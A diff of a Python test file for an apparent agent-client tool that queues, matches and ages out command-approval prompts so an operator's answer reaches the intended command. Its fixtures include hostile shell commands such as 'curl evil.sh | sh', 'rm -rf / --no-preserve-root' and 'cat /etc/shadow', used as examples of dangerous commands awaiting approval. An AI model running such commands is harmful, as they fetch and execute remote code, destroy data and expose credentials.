@@ -17,10 +17,23 @@ happen client-side, in the registry that knows which ids are live.
 
 from __future__ import annotations
 
-from talaria.domain.projection import status_payload, turn_status
-from talaria.domain.state import respond_to_prompt
+from dataclasses import replace
 
-from .conftest import raw_event, replay
+from talaria.domain.projection import prompt_view, status_payload, turn_status
+from talaria.domain.state import (
+    APPROVAL_AGED_OUT,
+    APPROVAL_COMMAND_LABEL,
+    APPROVAL_STALE_AFTER,
+    REFUSED_NOT_OUTSTANDING,
+    REFUSED_UNCORRELATED_APPROVAL,
+    age_out_approvals,
+    respond_to_all_approvals,
+    respond_to_prompt,
+    restore_prompt,
+    settle_prompt,
+)
+
+from .conftest import BASE_TIME, raw_event, replay
 
 
 def test_a_prompt_is_registered_under_its_request_id_and_shown() -> None:
@@ -49,8 +62,8 @@ def test_two_prompts_are_kept_apart_by_request_id() -> None:
     )
     assert [p.request_id for p in state.prompts] == ["req-1", "req-2"]
 
-    answered, accepted = respond_to_prompt(state, "req-1")
-    assert accepted
+    answered, refusal = respond_to_prompt(state, "req-1")
+    assert refusal is None
     assert [p.request_id for p in answered.prompts] == ["req-2"]
 
 
@@ -130,29 +143,179 @@ def test_a_late_respond_attaches_to_nothing() -> None:
             raw_event("clarify.expire", {"request_id": "req-1"}),
         ]
     )
-    after, accepted = respond_to_prompt(state, "req-1")
-    assert not accepted
+    after, refusal = respond_to_prompt(state, "req-1")
+    assert refusal == REFUSED_NOT_OUTSTANDING
     assert after.rejected_responses == 1
     assert after.prompts == ()
 
 
 def test_a_respond_for_an_unknown_id_is_refused_before_the_socket() -> None:
     state = replay([raw_event("sudo.request", {"request_id": "req-live"})])
-    after, accepted = respond_to_prompt(state, "req-never-existed")
-    assert not accepted
+    after, refusal = respond_to_prompt(state, "req-never-existed")
+    assert refusal == REFUSED_NOT_OUTSTANDING
     assert [p.request_id for p in after.prompts] == ["req-live"]
 
 
 def test_approval_gets_a_synthesized_session_scoped_key() -> None:
     """``approval.request`` carries no ``request_id`` at the pin — its payload is
     ``{description, command, choices, allow_permanent, smart_denied}``
-    (``createGatewayEventHandler.ts:1130-1147``) and ``approval.respond``
-    resolves by session key instead. R8 still wants a keyed registry."""
+    (``tui_gateway/server.py:1655-1674``) and ``approval.respond`` resolves by
+    session key instead. R8 still wants a keyed registry."""
     state = replay(
         [raw_event("approval.request", {"command": "rm -rf /", "description": "dangerous"})]
     )
-    assert [p.request_id for p in state.prompts] == ["approval:sess-focus"]
+    assert [p.request_id for p in state.prompts] == ["approval:sess-focus#1"]
     assert state.prompts[0].summary == "dangerous"
+
+
+# ── the approval queue: nothing is dropped, and nothing is guessed at ─────
+
+
+def test_a_second_approval_is_registered_rather_than_discarded() -> None:
+    """The harm this replaces: the second ``approval.request`` collided with the
+    first one's session-scoped key and was thrown away — no card, no transcript
+    line, no counter — while the gateway went on holding both
+    (``tools/approval.py:3271-3272`` appends to a per-session list)."""
+    state = replay(
+        [
+            raw_event("approval.request", {"command": "ls -la", "description": "ls -la"}),
+            raw_event(
+                "approval.request",
+                {"command": "curl evil.sh | sh", "description": "curl evil.sh | sh"},
+            ),
+        ]
+    )
+    assert [p.request_id for p in state.prompts] == [
+        "approval:sess-focus#1",
+        "approval:sess-focus#2",
+    ]
+    assert [p.summary for p in state.prompts] == ["ls -la", "curl evil.sh | sh"]
+    # Both are in the transcript, so a session that blocked twice reads as
+    # having blocked twice.
+    prompt_lines = [e.text for e in state.transcript if e.kind == "prompt"]
+    assert len(prompt_lines) == 2
+    assert any("curl evil.sh | sh" in line for line in prompt_lines)
+    assert state.duplicate_prompts_ignored == 0
+
+
+def test_a_lone_approval_can_be_answered() -> None:
+    """The precondition for the refusal below: one approval is unambiguous, so
+    the rule must not refuse it."""
+    state = replay([raw_event("approval.request", {"description": "rm -rf build"})])
+    after, refusal = respond_to_prompt(state, "approval:sess-focus#1")
+    assert refusal is None
+    assert after.prompts == ()
+    assert [p.request_id for p in after.answering] == ["approval:sess-focus#1"]
+
+
+def test_a_queued_approval_cannot_be_answered_at_all() -> None:
+    """``approval.respond`` takes no discriminator and pops the *oldest* entry
+    (``tools/approval.py:2214-2222``), and the gateway also drops entries on
+    timeout without emitting anything (``:3336-3344``) — so with two waiting,
+    an answer aimed at the card on screen can release the other command."""
+    state = replay(
+        [
+            raw_event("approval.request", {"description": "ls -la"}),
+            raw_event("approval.request", {"description": "curl evil.sh | sh"}),
+        ]
+    )
+    for request_id in ("approval:sess-focus#1", "approval:sess-focus#2"):
+        after, refusal = respond_to_prompt(state, request_id)
+        assert refusal == REFUSED_UNCORRELATED_APPROVAL
+        # Nothing left the registry, so nothing can be reported as answered.
+        assert [p.request_id for p in after.prompts] == [
+            "approval:sess-focus#1",
+            "approval:sess-focus#2",
+        ]
+        assert after.answering == ()
+        assert after.rejected_responses == 1
+
+
+def test_denying_them_all_takes_the_whole_queue_at_once() -> None:
+    """The one answer that needs no correlation: ``resolve_all`` applies one
+    choice to every entry (``tools/approval.py:2219-2226``), so it is right
+    whatever order the queue is in."""
+    state = replay(
+        [
+            raw_event("approval.request", {"description": "ls -la"}),
+            raw_event("approval.request", {"description": "curl evil.sh | sh"}),
+            raw_event("sudo.request", {"request_id": "u-1"}),
+        ]
+    )
+    after, scope = respond_to_all_approvals(state, session_id="sess-focus")
+
+    assert [p.summary for p in scope.taken] == ["ls -la", "curl evil.sh | sh"]
+    assert scope.already_in_flight == ()
+    assert scope.denied == 2
+    assert scope.undecided == 0
+    # The sudo prompt is a different bridge and is left alone.
+    assert [p.request_id for p in after.prompts] == ["u-1"]
+    assert len(after.answering) == 2
+
+
+# ── the in-flight window: an expiry that lands while the answer travels ──
+
+
+def test_an_expiry_during_an_in_flight_answer_still_leaves_a_marker() -> None:
+    """``respond_to_prompt`` empties ``prompts`` before the call goes out, and an
+    expiry arriving in that window used to match nothing: no transcript marker
+    at all for a question that timed out."""
+    state = replay([raw_event("sudo.request", {"request_id": "u-1"})])
+    state, refusal = respond_to_prompt(state, "u-1")
+    assert refusal is None
+    assert state.prompts == ()
+
+    expired = replay([raw_event("sudo.expire", {"request_id": "u-1"})], state=state)
+
+    markers = [e.text for e in expired.transcript if e.kind == "prompt-expired"]
+    assert markers == ["sudo prompt expired unanswered: sudo password required"]
+    assert "u-1" in expired.flushed_prompt_ids
+    assert expired.answering == ()
+
+
+def test_a_control_expired_mid_answer_is_not_put_back_by_a_failed_send() -> None:
+    """The whole point of ``flushed_prompt_ids``, which could not fire before:
+    the gateway has stopped listening, so re-offering the control leaves it
+    outstanding forever — no second ``.expire`` is ever emitted."""
+    state = replay([raw_event("sudo.request", {"request_id": "u-1"})])
+    prompt = state.prompt_for("u-1")
+    assert prompt is not None
+    state, _ = respond_to_prompt(state, "u-1")
+    state = replay([raw_event("sudo.expire", {"request_id": "u-1"})], state=state)
+
+    restored = restore_prompt(state, prompt)
+
+    assert restored.prompts == ()
+    assert restored.answering == ()
+    assert turn_status(restored) != "waiting"
+
+
+def test_a_failed_send_puts_the_control_back_when_nothing_expired() -> None:
+    """The discriminating half: without an expiry the restore must happen, or
+    the guard above would be indistinguishable from a broken restore."""
+    state = replay([raw_event("sudo.request", {"request_id": "u-1"})])
+    prompt = state.prompt_for("u-1")
+    assert prompt is not None
+    state, _ = respond_to_prompt(state, "u-1")
+
+    restored = restore_prompt(state, prompt)
+
+    assert [p.request_id for p in restored.prompts] == ["u-1"]
+    assert restored.answering == ()
+
+
+def test_a_re_announced_prompt_is_deduped_and_counted() -> None:
+    """A ``request_id`` already outstanding is the gateway re-announcing a live
+    prompt across a reconnect (F6). Keeping the first record is right; doing it
+    invisibly is what let a dropped approval look like nothing at all."""
+    state = replay(
+        [
+            raw_event("clarify.request", {"request_id": "req-1", "question": "Which?"}),
+            raw_event("clarify.request", {"request_id": "req-1", "question": "Which?"}),
+        ]
+    )
+    assert len(state.prompts) == 1
+    assert state.duplicate_prompts_ignored == 1
 
 
 def test_an_abandoned_clarify_is_flushed_when_its_tool_completes() -> None:
@@ -206,3 +369,297 @@ def test_a_prompt_summary_reads_only_named_outbound_fields() -> None:
     rendered = "\n".join(e.text for e in state.transcript)
     assert "sk-should-never-be-here" not in rendered
     assert "Paste the key" in rendered
+
+
+# ── the approval whose answer is in flight is still the gateway's ────────
+
+
+def test_an_approval_answered_a_moment_ago_still_counts_as_outstanding() -> None:
+    """``outstanding_approvals`` describes the **gateway's** queue, not the
+    screen.
+
+    ``respond_to_prompt`` moves a prompt into ``answering`` before the call goes
+    out, so reading ``prompts`` alone made the approval just answered invisible
+    for the length of one round trip — to the very rule that exists to stop a
+    second one being answered.
+    """
+    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
+    state, refusal = respond_to_prompt(state, "approval:sess-focus#1")
+    assert refusal is None
+    assert state.prompts == ()
+
+    assert [p.summary for p in state.outstanding_approvals("sess-focus")] == ["rm -rf /data"]
+
+
+def test_a_second_approval_arriving_mid_answer_cannot_be_answered() -> None:
+    """The harm, in the registry. With the first answer still travelling, the
+    second approval was answerable — so two ``approval.respond`` calls went out
+    against a resolver that pops the FIFO head with no discriminator, and which
+    command each released was decided by arrival order."""
+    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
+    state, refusal = respond_to_prompt(state, "approval:sess-focus#1")
+    assert refusal is None
+
+    state = replay([raw_event("approval.request", {"description": "ls"})], state=state)
+    assert [p.summary for p in state.prompts] == ["ls"]
+
+    after, refusal = respond_to_prompt(state, "approval:sess-focus#2")
+
+    assert refusal == REFUSED_UNCORRELATED_APPROVAL
+    assert [p.request_id for p in after.prompts] == ["approval:sess-focus#2"]
+    assert after.rejected_responses == 1
+
+
+def test_the_projection_marks_the_second_approval_unanswerable_mid_answer() -> None:
+    """The other consumer of the same rule. Both have to agree, or the card
+    offers a button the registry will refuse — or worse, the registry allows
+    what the card should never have offered."""
+    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
+    state, _ = respond_to_prompt(state, "approval:sess-focus#1")
+    state = replay([raw_event("approval.request", {"description": "ls"})], state=state)
+
+    rows = prompt_view(state).rows
+
+    assert [row.request_id for row in rows] == ["approval:sess-focus#2"]
+    assert rows[0].answerable is False
+    assert "cannot be aimed" in rows[0].blocked_reason
+
+
+def test_a_lone_approval_is_still_answerable_once_the_earlier_one_settles() -> None:
+    """The discriminating half. A rule that never lets an approval be answered
+    would satisfy every assertion above and break the feature — so the same
+    sequence with the first answer settled must come out answerable."""
+    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
+    state, _ = respond_to_prompt(state, "approval:sess-focus#1")
+    state = settle_prompt(state, "approval:sess-focus#1")
+    state = replay([raw_event("approval.request", {"description": "ls"})], state=state)
+
+    assert len(state.outstanding_approvals("sess-focus")) == 1
+    assert prompt_view(state).rows[0].answerable is True
+    _, refusal = respond_to_prompt(state, "approval:sess-focus#2")
+    assert refusal is None
+
+
+def test_outstanding_approvals_are_ordered_by_arrival_not_by_where_they_sit() -> None:
+    """The gateway's resolver pops oldest-first, so this order is a claim about
+    which command an answer would reach. Concatenating ``prompts`` and
+    ``answering`` gives the wrong one: ``answering`` holds what was answered
+    most recently, which is routinely *older* than what is still on screen."""
+    state = replay(
+        [
+            raw_event("approval.request", {"description": "first"}),
+            raw_event("approval.request", {"description": "second"}),
+        ]
+    )
+    # Answer the older one, so it moves to ``answering`` while the newer one
+    # stays in ``prompts`` — the arrangement a naive concatenation reverses.
+    state, refusal = respond_to_all_approvals(state, session_id="sess-focus")
+    state = settle_prompt(state, "approval:sess-focus#2")
+    state = replay([raw_event("approval.request", {"description": "third"})], state=state)
+
+    assert [p.summary for p in state.outstanding_approvals("sess-focus")] == [
+        "first",
+        "third",
+    ]
+
+
+def test_denying_them_all_names_the_one_it_does_not_take_without_claiming_it() -> None:
+    """``all: true`` reaches every entry in the gateway's queue, so an approval
+    whose own answer is in flight is swept too.
+
+    Two claims, and the split between them is the point. It is **named**,
+    because an operator told "2 denied" when the denial swept three is being
+    misled about a safety action. It is **not taken**, because the call that
+    owns it will settle or restore it when its reply lands. And it is **not
+    counted as denied**, because its own respond may be carrying the affirmative
+    the operator pressed a second earlier, and which of the two the gateway
+    applies is decided by arrival order there — summing the two groups into one
+    "denied" total put two different fates for one command into one transcript.
+    """
+    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
+    state, _ = respond_to_prompt(state, "approval:sess-focus#1")
+    state = replay(
+        [
+            raw_event("approval.request", {"description": "ls"}),
+            raw_event("approval.request", {"description": "cat /etc/shadow"}),
+        ],
+        state=state,
+    )
+
+    after, scope = respond_to_all_approvals(state, session_id="sess-focus")
+
+    assert [p.summary for p in scope.taken] == ["ls", "cat /etc/shadow"]
+    assert [p.summary for p in scope.already_in_flight] == ["rm -rf /data"]
+    # Named, and named apart: two denied by this call, one more the ``all``
+    # reaches whose outcome this call cannot speak for.
+    assert scope.denied == 2
+    assert scope.undecided == 1
+    # The in-flight entry is not duplicated into the set its own call will
+    # settle: two owners means either a double settle or a resurrected control.
+    assert [p.request_id for p in after.answering] == [
+        "approval:sess-focus#1",
+        "approval:sess-focus#2",
+        "approval:sess-focus#3",
+    ]
+
+
+def test_deny_all_refuses_when_every_approval_is_already_in_flight() -> None:
+    """Nothing on screen to deny, and the answers that exist are travelling.
+    Sending another denial would deliver a second value for questions that
+    already have one."""
+    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
+    state, _ = respond_to_prompt(state, "approval:sess-focus#1")
+
+    after, scope = respond_to_all_approvals(state, session_id="sess-focus")
+
+    assert scope.taken == ()
+    assert after.rejected_responses == 1
+
+
+def test_the_command_is_kept_beside_the_description_not_folded_into_it() -> None:
+    """At the pin the gateway sends both, and ``description`` is the joined
+    pattern warnings (``tools/approval.py:3616``) — so a summary that prefers it
+    names the warning and never names the command."""
+    state = replay(
+        [
+            raw_event(
+                "approval.request",
+                {
+                    "description": "recursive delete outside the workspace",
+                    "command": "rm -rf / --no-preserve-root",
+                },
+            )
+        ]
+    )
+    prompt = state.prompt_for("approval:sess-focus#1")
+    assert prompt is not None
+    assert prompt.summary == "recursive delete outside the workspace"
+    assert prompt.command == "rm -rf / --no-preserve-root"
+    # And the arrival entry — the one durable record that is never clipped —
+    # carries the command on its own line.
+    arrival = next(e for e in state.transcript if e.kind == "prompt")
+    assert arrival.text.splitlines() == [
+        "approval prompt awaiting an answer: recursive delete outside the workspace",
+        "command: rm -rf / --no-preserve-root",
+    ]
+
+
+def test_only_approval_carries_a_command() -> None:
+    """A ``command`` key on any other bridge is a payload Talaria does not read.
+    Rendering one would put gateway text on a card whose contract says the
+    summary is the whole question."""
+    state = replay(
+        [raw_event("clarify.request", {"request_id": "c-1", "question": "which?", "command": "x"})]
+    )
+    prompt = state.prompt_for("c-1")
+    assert prompt is not None
+    assert prompt.command == ""
+
+
+# ── approval is the one bridge with no gateway timeout announcement ──────
+
+
+def test_a_stale_approval_is_withdrawn_and_stops_blocking_the_queue() -> None:
+    """The gateway emits ``<bridge>.expire`` for ``secret``, ``sudo``,
+    ``clarify`` and ``terminal.read`` and for nothing else
+    (``tui_gateway/server.py:2981-2998``); ``tools/approval.py`` drops its own
+    entry on timeout through ``_drop_entry()`` with no emit. So ``_EXPIRE_EVENTS``
+    correctly has no ``approval.expire`` — and nothing else aged one out either.
+
+    The consequence is not cosmetic. A phantom approval keeps
+    ``outstanding_approvals`` above one, which marks a *genuine* later approval
+    unanswerable, which leaves the operator unable to allow the command they
+    want to allow while the only offered action denies it.
+    """
+    state = replay(
+        [
+            raw_event("approval.request", {"description": "stale", "command": "rm -rf /old"}),
+            raw_event("approval.request", {"description": "real", "command": "ls"}),
+        ]
+    )
+    fresh = state.prompt_for("approval:sess-focus#2")
+    assert fresh is not None
+    assert all(not row.answerable for row in prompt_view(state).rows)
+
+    # One second past the older approval's deadline and one second short of the
+    # newer one's, so the boundary itself is under test rather than assumed.
+    after = age_out_approvals(state, now=fresh.opened_at + APPROVAL_STALE_AFTER - 1.0)
+
+    assert [p.request_id for p in after.prompts] == ["approval:sess-focus#2"]
+    assert [row.answerable for row in prompt_view(after).rows] == [True]
+    assert turn_status(after) == "waiting"
+    # The latch, so a late ``restore_prompt`` cannot put back a control the
+    # operator has already been told is gone.
+    assert "approval:sess-focus#1" in after.flushed_prompt_ids
+    restored = restore_prompt(after, state.prompts[0])
+    assert [p.request_id for p in restored.prompts] == ["approval:sess-focus#2"]
+
+
+def test_the_withdrawal_claims_nothing_about_what_the_gateway_did() -> None:
+    """The gateway's approval timeout is *configurable*
+    (``_get_approval_timeout()``, ``tools/approval.py:2648-2657``), so Talaria
+    knows the default and the failure direction and not the real deadline. It
+    may say the wait has probably passed. It may not say the command was
+    denied, however likely that is — no reply said so."""
+    state = replay(
+        [raw_event("approval.request", {"description": "stale", "command": "rm -rf /old"})]
+    )
+    after = age_out_approvals(state, now=BASE_TIME + APPROVAL_STALE_AFTER + 1.0)
+
+    note = next(e for e in after.transcript if e.kind == "prompt-expired")
+    assert APPROVAL_AGED_OUT in note.text
+    assert "probably stopped waiting" in note.text
+    assert "nothing was sent" in note.text
+    assert "denied" not in note.text
+    # The command is carried, on its own line, so the withdrawal is auditable
+    # against the arrival entry that announced it.
+    assert note.text.splitlines()[-1] == f"{APPROVAL_COMMAND_LABEL}rm -rf /old"
+
+
+def test_the_age_out_leaves_alone_everything_it_cannot_speak_for() -> None:
+    """Three exclusions, each of them a way a local timeout could do damage.
+
+    The other four bridges have a real ``.expire`` coming, so ageing them out
+    locally would write a second, differently worded marker for one timeout. An
+    approval in ``answering`` has a bounded call of its own that will settle or
+    restore it, and two owners for one entry is the bookkeeping defect this
+    module already carries two comments about. And a corpus whose timestamps did
+    not parse reads as ``0.0``, which is an absent time rather than an ancient
+    one.
+    """
+    state = replay(
+        [
+            raw_event("sudo.request", {"request_id": "u-1"}),
+            raw_event("clarify.request", {"request_id": "c-1", "question": "which?"}),
+            raw_event("approval.request", {"description": "in flight"}),
+        ]
+    )
+    state, refusal = respond_to_prompt(state, "approval:sess-focus#1")
+    assert refusal is None
+
+    after = age_out_approvals(state, now=BASE_TIME + 10 * APPROVAL_STALE_AFTER)
+
+    assert [p.request_id for p in after.prompts] == ["u-1", "c-1"]
+    assert [p.request_id for p in after.answering] == ["approval:sess-focus#1"]
+    assert after.transcript == state.transcript
+
+    undated = replace(
+        replay([raw_event("approval.request", {"description": "no clock"})]),
+        prompts=(),
+    )
+    stale = replay([raw_event("approval.request", {"description": "no clock"})])
+    undated = replace(undated, prompts=(replace(stale.prompts[0], opened_at=0.0),))
+    assert age_out_approvals(undated, now=BASE_TIME + 10 * APPROVAL_STALE_AFTER) is undated
+    assert age_out_approvals(stale, now=0.0) is stale
+
+
+def test_the_age_out_is_driven_by_the_clock_its_prompt_was_stamped_with() -> None:
+    """AE2 asks that replaying one corpus twice produce identical state. A
+    recorded frame carries the time it was recorded at, so a wall-clock read
+    here would age out an entire corpus on its first tick and make the result
+    depend on when the replay was run."""
+    state = replay([raw_event("approval.request", {"description": "recorded"})])
+    assert age_out_approvals(state, now=state.last_observed_at) is state
+    assert age_out_approvals(state, now=state.last_observed_at) == age_out_approvals(
+        state, now=state.last_observed_at
+    )
